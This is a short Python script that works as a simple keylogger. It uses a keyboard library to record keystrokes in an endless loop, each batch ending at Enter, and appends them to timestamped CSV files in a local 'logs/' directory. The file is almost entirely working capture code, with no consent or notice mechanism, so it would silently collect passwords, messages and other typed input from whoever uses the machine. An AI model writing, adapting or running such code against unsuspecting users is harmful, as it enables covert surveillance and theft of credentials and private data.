from lib import keyboard    
from datetime import datetime   
import os   

def checkLogsPath(path):
    if os.path.exists(path) == False:
        os.mkdir(path)

def recording():
    return keyboard.record(until=('enter'))

def calcualteDataAndHour():
    tempTime = datetime.now()
    return str(tempTime.strftime("%Y-%m-%d %H.%M.%S"))

def writeToFile(lPath, lName, l):
    newLog = open(lPath + lName, "a")
    newLog.write(str(l))
    newLog.close()

def main():

    tempLogName = calcualteDataAndHour()
    logsPath = "logs/"

    checkLogsPath(logsPath)

    while True:
        tempLog = recording()

        writeToFile(logsPath,tempLogName+".csv",tempLog)

#########################
if __name__== "__main__":
   main()                
#########################